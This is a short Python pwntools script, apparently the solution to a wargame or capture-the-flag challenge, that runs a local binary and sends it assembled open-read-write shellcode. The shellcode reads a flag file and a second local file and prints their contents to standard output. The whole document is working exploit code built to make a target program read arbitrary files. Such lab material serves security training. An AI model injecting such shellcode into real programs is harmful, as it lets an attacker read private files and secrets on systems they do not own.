from pwn import *

context.arch="amd64"

p = process('./test')

# Stage 1: Read flag_name_is_loooooong
r1 = '/home/kali/wargame/0x01_making/KillerName'
#sc += shellcraft.read('rax', 'rsp', 0x100)
#sc += shellcraft.write(1, 'rsp', 0x100)
r = "/home/shell_basic/flag_name_is_loooooong"

sc = ''
sc += shellcraft.open(r)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)

print(p.recv())

shellcode = asm(sc)
p.sendline(shellcode)

print(p.recv())

sc = ''
sc += shellcraft.open(r1)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)

print(p.recv())

shellcode = asm(sc)
p.sendline(shellcode)

print(p.recv())
